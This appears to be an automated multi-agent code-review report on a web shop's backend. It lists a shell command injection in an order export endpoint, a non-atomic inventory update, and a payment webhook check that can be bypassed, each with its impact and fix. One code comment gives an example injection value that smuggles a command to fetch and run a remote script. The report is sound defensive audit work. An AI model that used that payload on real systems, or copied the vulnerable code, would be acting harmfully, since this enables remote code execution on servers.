CRITICAL SecurityAgent

Command injection in the order export endpoint

app/api/export.pyL42–L48 
# user-controlled date_range goes straight into a shell command
def export_orders(request):
    date_range = request.args.get("range")
    out = f"/tmp/orders_{date_range}.csv"
    # dangerous: date_range = "2026; curl evil.sh | sh"
    subprocess.call(f"python manage.py dumpdata orders > {out}", shell=True)
    return send_file(out)
Impact: Any authenticated user can run arbitrary commands on the app server with the process's privileges by shaping the range parameter. The endpoint is internet-facing and needs only a normal account.
Fix: Drop shell=True and pass an argument list; allowlist date_range against ^\d{4}-\d{2}$; build the output path with tempfile.mkstemp() instead of concatenating user input.
Related: the os.system() call at L51 in the same file has the same shape and should be fixed with it.
HIGH LogicAgent

Inventory decrement is not atomic — concurrent orders oversell

app/services/inventory.pyL88–L96 
# read-modify-write with no lock and no database constraint
stock = db.query(Item).get(item_id)      # reads 5
if stock.quantity >= qty:                    # another request also reads 5
    stock.quantity -= qty                    # both write back 3
    db.commit()                               # 4 sold, stock down by 2
Impact: Guaranteed oversell during a sale, which turns into unfulfillable orders and support tickets. Reproducible at 50 concurrent requests under load test.
Fix: Use a conditional update — UPDATE items SET quantity = quantity - :qty WHERE id = :id AND quantity >= :qty — and treat the affected-row count as the result; or take SELECT ... FOR UPDATE.
HIGH SecurityAgent + RepoAgent

Payment webhook signature check can be bypassed

Where: app/api/payment.py L120
Problem: The verifier returns True when the secret is empty, and PAYMENT_SECRET defaults to an empty string in new environments. One environment missing that variable turns any forged callback into a paid order.
Fix: Raise instead of returning when the secret is missing; validate config at startup and refuse to boot without it.
Note: two agents found this independently. The coordinator merged them and kept RepoAgent's context about the default value.
